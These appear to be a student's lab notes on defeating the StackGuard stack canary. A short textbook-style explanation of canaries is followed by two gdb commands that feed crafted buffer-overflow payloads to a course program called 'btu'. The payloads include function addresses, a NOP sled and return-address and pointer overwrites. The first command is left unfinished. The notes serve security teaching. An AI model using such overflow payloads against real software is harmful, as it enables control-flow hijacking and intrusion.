# Defeating Stack Gaurd
![alt text](image-27.png)
![alt text](image-28.png)
* If we do not want to affect the value in a particular location during 
the memory copy, such as the shaded position marked as Guard in Figure 4. 12, the only way to 
achieve that is to overwrite the location with the same value that is stored there
* Based on this observation, we can place some non-predictable value (called guard) between 
the buffer and the return address. Before returning from the function, we check whether the 
value is modified or not. If it is modi fied, chances are that the return address may have also 
been modified. Therefore, the problem of detecting whether the return address is overwritten is 
reduced to detecting whether the guard is overwritten. These two problems seem Lo be the same, 
but they are not. By looking at the value of the return address, we do not know whether its value 
is modi fied or not, but since the value of the guard is placed by us, it is easy to know whether 
the guard 's value is modified or not.

# Martin code: 

```bash
gdb --args ./build/bin/btu add Martin "$(python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x66\xb1\x04\x08" +  # exmatriculate() address
    b"\xb0\x25\xb1\xf7" +  # exit() address
    b"\x60\x0c\x05\x08" +  # this pointer (btu)
    b"\xff\x1c\x45\x6a"    # student ID (Klaus)
)')" 222 "$(python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90"*32 +           # NOP sled to fill password buffer (32 bytes)
    b"DDDD" +              # filler for next 4 bytes after buffer
    b"\x6c\xcb\xff\xff"    # return address overwrite (points to last_name ROP chain)
```

## My Command: 
gdb --args ./build/bin/btu add Zuzzz \
"$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xef\xbe\xad\xde")')" \
222 \
"$(python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*32 +              # Fill password buffer
    b"BBBB" +              # Filler
    b"\xcd\xab\xff\xff"    # Overwrite last_name pointer → 0xFFFFABCD
)')"
qq